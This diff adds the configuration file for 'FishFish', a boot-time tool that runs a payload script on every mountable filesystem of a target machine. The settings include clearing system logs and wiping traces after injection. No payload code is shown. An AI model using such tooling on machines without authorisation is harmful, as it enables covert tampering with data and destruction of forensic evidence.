@@ -1,0 +1,29 @@
+# FishFish Runtime Configuration
+# This tool injects a payload into filesystems at boot time.
+# Boot this ISO on a target machine and it will run payload.sh on every
+# mountable filesystem it finds (except the boot USB itself).
+
+# TARGET_FILTER: comma-separated UUIDs or LABELs to limit injection scope.
+#   Default (*) = inject into ALL detected filesystems.
+#   Examples:
+#     TARGET_FILTER=FISHTEST
+#     TARGET_FILTER=1234-5678,backup-disk
+TARGET_FILTER=*
+
+# Maximum seconds to wait for payload per filesystem
+PAYLOAD_TIMEOUT=30
+
+# Log verbosity: verbose or quiet
+LOG_LEVEL=verbose
+
+# Remove traces after injection (logs, history)
+WIPE_TRACES=false
+
+# Clear system logs before finishing
+CLEAR_LOGS=true
+
+# Halt if LUKS encryption is detected (safety)
+HALT_ON_LUKS=true
+
+# Skip network probing
+SKIP_NETWORK_PROBE=false
